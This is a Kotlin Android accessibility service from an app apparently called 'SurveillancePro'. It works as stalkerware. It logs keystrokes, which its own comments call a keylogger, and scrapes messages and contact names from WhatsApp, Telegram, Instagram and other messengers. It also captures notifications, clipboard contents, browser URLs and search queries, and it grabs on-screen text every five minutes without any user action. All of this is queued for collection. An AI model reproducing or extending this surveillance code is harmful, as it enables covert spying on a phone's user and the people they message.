package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.content.ClipboardManager
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionAccessibilityService : AccessibilityService() {

    private var lastKeystrokeText = ""
    private var lastKeystrokePackage = ""
    private var lastKeystrokeTime = 0L

    private var lastFocusPackage = ""
    private var lastNotifText = ""
    private var lastNotifTime = 0L

    // Cache pour éviter les doublons de messages capturés
    private val capturedMessages = LinkedHashMap<String, Long>(100, 0.75f, true)
    private val MAX_CACHE_SIZE = 200

    // Apps de messagerie à surveiller en priorité
    private val messagingApps = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram",
        "com.snapchat.android" to "Snapchat",
        "com.instagram.android" to "Instagram",
        "com.facebook.orca" to "Messenger",
        "com.facebook.mlite" to "Messenger Lite",
        "com.tiktok.android" to "TikTok",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.viber.voip" to "Viber",
        "com.discord" to "Discord",
        "com.skype.raider" to "Skype",
        "jp.naver.line.android" to "LINE",
        "com.imo.android.imoim" to "imo",
        "com.google.android.apps.messaging" to "Messages",
        "com.samsung.android.messaging" to "Samsung Messages",
        "com.android.mms" to "Messages",
    )

    // Patterns pour détecter les conversations
    private val conversationPatterns = listOf(
        "RecyclerView", "ListView", "ScrollView", "ViewGroup"
    )

    // Buffer pour accumuler les frappes avant envoi
    private var keystrokeBuffer = ""
    private var keystrokeBufferPackage = ""
    private var keystrokeBufferStart = 0L
    private val BUFFER_FLUSH_DELAY = 3000L

    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
    private val flushRunnable = Runnable { flushKeystrokeBuffer() }

    // Clipboard
    private var lastClipText = ""
    private var lastClipTime = 0L
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null

    // Chrome URL capture
    private var lastChromeUrl = ""
    private var lastChromeUrlTime = 0L
    private val browserPackages = setOf(
        "com.android.chrome", "com.chrome.beta", "com.chrome.dev",
        "org.mozilla.firefox", "com.opera.browser", "com.brave.browser",
        "com.microsoft.emmx", "com.samsung.android.app.sbrowser",
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        startClipboardMonitor()
        startPeriodicCapture()
        
        // Enregistrer ce service pour la capture d'écran rapide (Android 11+)
        RapidScreenCapture.setAccessibilityService(this)
    }

    // ─── CAPTURE PÉRIODIQUE FORCÉE ─────────────────────────────────────────────

    private val periodicCaptureRunnable = object : Runnable {
        override fun run() {
            forceScreenCapture()
            handler.postDelayed(this, PERIODIC_CAPTURE_INTERVAL)
        }
    }
    private val PERIODIC_CAPTURE_INTERVAL = 5 * 60 * 1000L // 5 minutes - économie batterie

    private fun startPeriodicCapture() {
        handler.removeCallbacks(periodicCaptureRunnable)
        handler.postDelayed(periodicCaptureRunnable, 10_000L) // Première capture après 10s
    }

    /**
     * Force la capture de l'écran actuel - capture les messages visibles
     * même si l'utilisateur ne fait rien.
     */
    private fun forceScreenCapture() {
        val root = try { rootInActiveWindow } catch (_: Exception) { null } ?: return
        val packageName = root.packageName?.toString() ?: return

        // Si on est dans une app de messagerie, capturer les messages
        if (messagingApps.containsKey(packageName)) {
            scanVisibleMessages(packageName)
        }

        // Capturer aussi le texte visible pour le keylogger
        captureVisibleText(root, packageName)
    }

    private fun captureVisibleText(root: AccessibilityNodeInfo, packageName: String) {
        try {
            val allText = mutableListOf<String>()
            extractAllText(root, allText, 0)

            if (allText.isEmpty()) return

            val combinedText = allText.joinToString(" | ").take(2000)
            val textHash = "$packageName:$combinedText".hashCode().toString()

            // Éviter les doublons
            if (capturedMessages.containsKey(textHash)) return
            capturedMessages[textHash] = System.currentTimeMillis()

            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            val queue = EventQueue.getInstance(applicationContext)

            queue.enqueue("screen_text", mapOf(
                "app" to packageName,
                "text" to combinedText,
                "elementCount" to allText.size,
                "timestamp" to timestamp,
            ))
        } catch (_: Exception) {}
    }

    private fun extractAllText(node: AccessibilityNodeInfo, texts: MutableList<String>, depth: Int) {
        if (depth > 15 || texts.size > 50) return

        val text = node.text?.toString()?.trim()
        if (!text.isNullOrBlank() && text.length > 3 && text.length < 500) {
            // Filtrer les éléments UI communs
            if (!isUIElement(text)) {
                texts.add(text)
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractAllText(child, texts, depth + 1)
        }
    }

    private fun isUIElement(text: String): Boolean {
        val uiPatterns = listOf(
            "OK", "Cancel", "Annuler", "Retour", "Back", "Menu", "Settings",
            "Paramètres", "Envoyer", "Send", "Search", "Rechercher",
            "Home", "Accueil", "More", "Plus", "Share", "Partager",
        )
        return uiPatterns.any { text.equals(it, ignoreCase = true) }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        // Verifier le blocage d'apps
        val packageName = event.packageName?.toString()
        if (packageName != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (AppBlockerService.onAppOpened(applicationContext, packageName)) {
                return // App bloquee, ne pas traiter l'evenement
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChanged(event)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                handleContentChanged(event)
                handleBrowserUrlCapture(event)
                // Capture des messages dans les apps de messagerie ouvertes
                handleMessagingAppContent(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleBrowserUrlCapture(event)
                // Quand on ouvre une app de messagerie, scanner les messages visibles
                handleMessagingAppOpened(event)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {}
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                // Quand l'utilisateur scroll dans une conversation
                handleMessagingAppContent(event)
            }
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val now = System.currentTimeMillis()

        // Si on change d'app, on flush le buffer précédent
        if (packageName != keystrokeBufferPackage && keystrokeBuffer.isNotEmpty()) {
            flushKeystrokeBuffer()
        }

        // Éviter les doublons stricts seulement (même texte exact, même app, < 500ms)
        if (text == lastKeystrokeText && packageName == lastKeystrokePackage && now - lastKeystrokeTime < 500) return

        lastKeystrokeText = text
        lastKeystrokePackage = packageName
        lastKeystrokeTime = now

        // Accumuler dans le buffer
        keystrokeBuffer = text
        keystrokeBufferPackage = packageName
        if (keystrokeBufferStart == 0L) keystrokeBufferStart = now

        // Programmer un flush après le délai d'inactivité
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, BUFFER_FLUSH_DELAY)

        // Flush immédiat si le buffer est très long (message complet probable)
        if (text.length > 200) {
            handler.removeCallbacks(flushRunnable)
            flushKeystrokeBuffer()
        }
    }

    private fun flushKeystrokeBuffer() {
        if (keystrokeBuffer.isBlank()) return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("keystroke", mapOf(
            "text" to keystrokeBuffer.take(2000),
            "app" to keystrokeBufferPackage,
            "timestamp" to timestamp,
        ))

        keystrokeBuffer = ""
        keystrokeBufferPackage = ""
        keystrokeBufferStart = 0L
    }

    private fun handleContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val source = event.source ?: return

        try {
            val editTexts = mutableListOf<AccessibilityNodeInfo>()
            findEditTexts(source, editTexts, depth = 0)

            for (node in editTexts) {
                val text = node.text?.toString() ?: continue
                if (text.isBlank()) continue

                val now = System.currentTimeMillis()
                if (text == lastKeystrokeText && packageName == lastKeystrokePackage && now - lastKeystrokeTime < 500) continue

                lastKeystrokeText = text
                lastKeystrokePackage = packageName
                lastKeystrokeTime = now

                if (packageName != keystrokeBufferPackage && keystrokeBuffer.isNotEmpty()) {
                    flushKeystrokeBuffer()
                }

                keystrokeBuffer = text
                keystrokeBufferPackage = packageName
                if (keystrokeBufferStart == 0L) keystrokeBufferStart = now

                handler.removeCallbacks(flushRunnable)
                handler.postDelayed(flushRunnable, BUFFER_FLUSH_DELAY)
            }
        } catch (_: Exception) {
        } finally {
            try { source.recycle() } catch (_: Exception) {}
        }
    }

    private fun findEditTexts(node: AccessibilityNodeInfo, results: MutableList<AccessibilityNodeInfo>, depth: Int) {
        if (depth > 15) return
        if (node.className?.toString()?.contains("EditText") == true || node.isEditable) {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findEditTexts(child, results, depth + 1)
        }
    }

    private fun handleFocusChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName == lastFocusPackage) return

        // Flush keystroke buffer quand on change d'app
        if (keystrokeBuffer.isNotEmpty()) {
            flushKeystrokeBuffer()
        }

        lastFocusPackage = packageName

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("app_focus", mapOf(
            "app" to packageName,
            "timestamp" to timestamp,
        ))
    }

    private fun handleNotification(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.joinToString(" ")?.trim() ?: return
        if (text.isBlank() || text.length < 2) return

        val now = System.currentTimeMillis()
        
        // Anti-doublon amélioré
        val messageHash = "$packageName:$text".hashCode().toString()
        if (capturedMessages.containsKey(messageHash) && now - (capturedMessages[messageHash] ?: 0) < 10000) return
        
        // Nettoyer le cache si trop grand
        if (capturedMessages.size > MAX_CACHE_SIZE) {
            val oldest = capturedMessages.keys.firstOrNull()
            if (oldest != null) capturedMessages.remove(oldest)
        }
        capturedMessages[messageHash] = now
        lastNotifText = text
        lastNotifTime = now

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        // Extraire le sender depuis contentDescription ou le texte
        val contentDesc = event.contentDescription?.toString() ?: ""
        val sender = extractSender(contentDesc, text, packageName)
        val appName = messagingApps[packageName] ?: packageName.substringAfterLast(".")
        
        // Déterminer le type d'événement
        val eventType = if (messagingApps.containsKey(packageName)) "message_captured" else "notification_message"

        queue.enqueue(eventType, mapOf(
            "app" to appName,
            "package" to packageName,
            "message" to text.take(2000),
            "sender" to sender,
            "source" to "notification",
            "isMessagingApp" to messagingApps.containsKey(packageName),
            "timestamp" to timestamp,
        ))
    }

    private fun extractSender(contentDesc: String, text: String, packageName: String): String {
        // WhatsApp: "Nom: message" ou contentDescription contient le nom
        if (packageName.contains("whatsapp")) {
            if (contentDesc.isNotBlank() && !contentDesc.contains("WhatsApp")) return contentDesc.take(50)
            val colonIndex = text.indexOf(":")
            if (colonIndex in 1..30) return text.substring(0, colonIndex).trim()
        }
        // Telegram: contentDescription souvent "Nom, message"
        if (packageName.contains("telegram")) {
            if (contentDesc.isNotBlank()) {
                val commaIndex = contentDesc.indexOf(",")
                if (commaIndex in 1..30) return contentDesc.substring(0, commaIndex).trim()
                return contentDesc.take(30)
            }
        }
        // Instagram/Snapchat: contentDescription
        if (contentDesc.isNotBlank() && contentDesc.length < 50) return contentDesc
        return ""
    }

    // ─── MESSAGING APP CONTENT CAPTURE (SANS ROOT) ─────────────────────────────

    private var lastMessagingCapture = 0L
    private var lastConversationName = ""

    /**
     * Capture les messages visibles quand l'utilisateur ouvre une app de messagerie.
     * Fonctionne SANS ROOT via l'Accessibility Service.
     */
    private fun handleMessagingAppOpened(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (!messagingApps.containsKey(packageName)) return

        // Délai pour éviter trop de captures
        val now = System.currentTimeMillis()
        if (now - lastMessagingCapture < 2000) return
        lastMessagingCapture = now

        // Scanner les messages visibles
        scanVisibleMessages(packageName)
    }

    /**
     * Capture les messages quand le contenu change (nouveau message reçu/envoyé).
     */
    private fun handleMessagingAppContent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (!messagingApps.containsKey(packageName)) return

        val now = System.currentTimeMillis()
        if (now - lastMessagingCapture < 1500) return
        lastMessagingCapture = now

        scanVisibleMessages(packageName)
    }

    private fun scanVisibleMessages(packageName: String) {
        val root = try { rootInActiveWindow } catch (_: Exception) { null } ?: return

        try {
            val appName = messagingApps[packageName] ?: return
            val messages = mutableListOf<Map<String, String>>()
            val conversationName = findConversationName(root, packageName)

            // Trouver tous les TextViews qui ressemblent à des messages
            findMessageNodes(root, messages, packageName, 0)

            if (messages.isEmpty()) return

            // Éviter les doublons de conversation
            val messagesHash = messages.joinToString("|") { it["text"] ?: "" }.hashCode().toString()
            if (capturedMessages.containsKey(messagesHash)) return
            capturedMessages[messagesHash] = System.currentTimeMillis()

            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            val queue = EventQueue.getInstance(applicationContext)

            // Envoyer chaque message individuellement pour un meilleur affichage
            for (msg in messages.takeLast(10)) { // Derniers 10 messages visibles
                val msgText = msg["text"] ?: continue
                val msgHash = "$packageName:$msgText".hashCode().toString()
                if (capturedMessages.containsKey(msgHash)) continue
                capturedMessages[msgHash] = System.currentTimeMillis()

                queue.enqueue("message_captured", mapOf(
                    "app" to appName,
                    "package" to packageName,
                    "message" to msgText,
                    "sender" to (msg["sender"] ?: conversationName),
                    "conversation" to conversationName,
                    "source" to "screen_capture",
                    "timestamp" to timestamp,
                ))
            }

            // Log de la conversation capturée
            if (conversationName.isNotBlank() && conversationName != lastConversationName) {
                lastConversationName = conversationName
                queue.enqueue("conversation_opened", mapOf(
                    "app" to appName,
                    "conversation" to conversationName,
                    "messageCount" to messages.size,
                    "timestamp" to timestamp,
                ))
            }

        } catch (_: Exception) {
        }
    }

    private fun findConversationName(root: AccessibilityNodeInfo, packageName: String): String {
        // WhatsApp: le nom est dans la toolbar en haut
        if (packageName.contains("whatsapp")) {
            val ids = listOf("conversation_contact_name", "contact_name")
            for (id in ids) {
                val nodes = root.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
                if (!nodes.isNullOrEmpty()) {
                    return nodes[0].text?.toString() ?: ""
                }
            }
        }
        // Telegram
        if (packageName.contains("telegram")) {
            val nodes = root.findAccessibilityNodeInfosByViewId("$packageName:id/action_bar_title")
            if (!nodes.isNullOrEmpty()) return nodes[0].text?.toString() ?: ""
        }
        // Instagram
        if (packageName.contains("instagram")) {
            val nodes = root.findAccessibilityNodeInfosByViewId("$packageName:id/thread_title")
            if (!nodes.isNullOrEmpty()) return nodes[0].text?.toString() ?: ""
        }
        // Messenger
        if (packageName.contains("facebook")) {
            val nodes = root.findAccessibilityNodeInfosByViewId("$packageName:id/thread_title_name")
            if (!nodes.isNullOrEmpty()) return nodes[0].text?.toString() ?: ""
        }
        // Fallback: chercher un TextView en haut qui ressemble à un nom
        return findTitleText(root, 0) ?: ""
    }

    private fun findTitleText(node: AccessibilityNodeInfo, depth: Int): String? {
        if (depth > 5) return null
        val className = node.className?.toString() ?: ""
        if (className.contains("TextView")) {
            val text = node.text?.toString() ?: ""
            // Un nom de contact est généralement court et sans caractères spéciaux
            if (text.length in 2..40 && !text.contains("http") && !text.contains("\n")) {
                return text
            }
        }
        for (i in 0 until minOf(node.childCount, 5)) {
            val child = node.getChild(i) ?: continue
            val result = findTitleText(child, depth + 1)
            if (result != null) return result
        }
        return null
    }

    private fun findMessageNodes(node: AccessibilityNodeInfo, messages: MutableList<Map<String, String>>, packageName: String, depth: Int) {
        if (depth > 20) return

        val className = node.className?.toString() ?: ""
        val text = node.text?.toString()?.trim() ?: ""

        // Filtrer les textes qui ressemblent à des messages
        if (className.contains("TextView") && text.length in 2..2000) {
            // Ignorer les éléments UI (boutons, labels courts, timestamps)
            val isLikelyMessage = text.length > 5 &&
                !text.matches(Regex("^\\d{1,2}:\\d{2}.*")) && // Pas un timestamp
                !text.matches(Regex("^\\d+$")) && // Pas juste des chiffres
                !text.equals("Envoyer", ignoreCase = true) &&
                !text.equals("Send", ignoreCase = true) &&
                !text.equals("Retour", ignoreCase = true) &&
                !text.equals("Back", ignoreCase = true) &&
                !text.contains("en ligne", ignoreCase = true) &&
                !text.contains("online", ignoreCase = true) &&
                !text.contains("typing", ignoreCase = true) &&
                !text.contains("écrit", ignoreCase = true)

            if (isLikelyMessage) {
                // Essayer de déterminer si c'est un message envoyé ou reçu
                val contentDesc = node.contentDescription?.toString() ?: ""
                val sender = if (contentDesc.isNotBlank()) extractSender(contentDesc, text, packageName) else ""

                messages.add(mapOf(
                    "text" to text.take(2000),
                    "sender" to sender,
                ))
            }
        }

        // Parcourir les enfants
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findMessageNodes(child, messages, packageName, depth + 1)
        }
    }

    // ─── CLIPBOARD MONITOR ─────────────────────────────────────────────

    private fun startClipboardMonitor() {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager ?: return
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            try {
                val clip = cm.primaryClip ?: return@OnPrimaryClipChangedListener
                if (clip.itemCount == 0) return@OnPrimaryClipChangedListener
                val text = clip.getItemAt(0).coerceToText(applicationContext)?.toString() ?: return@OnPrimaryClipChangedListener
                if (text.isBlank() || text.length > 5000) return@OnPrimaryClipChangedListener

                val now = System.currentTimeMillis()
                if (text == lastClipText && now - lastClipTime < 3000) return@OnPrimaryClipChangedListener
                lastClipText = text
                lastClipTime = now

                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
                val queue = EventQueue.getInstance(applicationContext)
                queue.enqueue("clipboard", mapOf(
                    "text" to text.take(2000),
                    "length" to text.length,
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
        cm.addPrimaryClipChangedListener(clipboardListener)
    }

    // ─── BROWSER URL CAPTURE ─────────────────────────────────────────────

    private fun handleBrowserUrlCapture(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName !in browserPackages) return

        val source = try { rootInActiveWindow } catch (_: Exception) { null } ?: return
        try {
            val urlBar = findUrlBar(source)
            val url = urlBar?.text?.toString() ?: return
            if (url.isBlank() || url.length < 4) return

            val now = System.currentTimeMillis()
            if (url == lastChromeUrl && now - lastChromeUrlTime < 5000) return
            lastChromeUrl = url
            lastChromeUrlTime = now

            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            val queue = EventQueue.getInstance(applicationContext)

            val isSearch = !url.contains("://") && !url.contains(".") && url.contains(" ")
            if (isSearch) {
                queue.enqueue("chrome_search", mapOf(
                    "query" to url,
                    "engine" to "Google",
                    "browser" to readableBrowserName(packageName),
                    "timestamp" to timestamp,
                ))
            } else {
                queue.enqueue("chrome_page", mapOf(
                    "url" to if (url.startsWith("http")) url else "https://$url",
                    "title" to "",
                    "browser" to readableBrowserName(packageName),
                    "timestamp" to timestamp,
                ))
            }
        } catch (_: Exception) {
        }
    }

    private fun findUrlBar(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val urlBarIds = listOf("url_bar", "url_field", "search_box_text", "mozac_browser_toolbar_url_view", "url")
        for (id in urlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId("${root.packageName}:id/$id")
            if (!nodes.isNullOrEmpty()) return nodes[0]
        }
        // Fallback: chercher un EditText avec un texte qui ressemble à une URL
        return findUrlEditText(root, 0)
    }

    private fun findUrlEditText(node: AccessibilityNodeInfo, depth: Int): AccessibilityNodeInfo? {
        if (depth > 8) return null
        if ((node.className?.toString()?.contains("EditText") == true || node.isEditable) && node.isFocusable) {
            val text = node.text?.toString() ?: ""
            if (text.contains(".") || text.contains("://")) return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findUrlEditText(child, depth + 1)
            if (result != null) return result
        }
        return null
    }

    private fun readableBrowserName(pkg: String): String = when (pkg) {
        "com.android.chrome" -> "Chrome"
        "com.chrome.beta" -> "Chrome Beta"
        "org.mozilla.firefox" -> "Firefox"
        "com.opera.browser" -> "Opera"
        "com.brave.browser" -> "Brave"
        "com.microsoft.emmx" -> "Edge"
        "com.samsung.android.app.sbrowser" -> "Samsung Internet"
        else -> pkg.substringAfterLast(".")
    }

    override fun onInterrupt() {
        flushKeystrokeBuffer()
    }

    override fun onDestroy() {
        flushKeystrokeBuffer()
        handler.removeCallbacks(flushRunnable)
        handler.removeCallbacks(periodicCaptureRunnable)
        clipboardListener?.let {
            (getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager)
                ?.removePrimaryClipChangedListener(it)
        }
        super.onDestroy()
    }
}
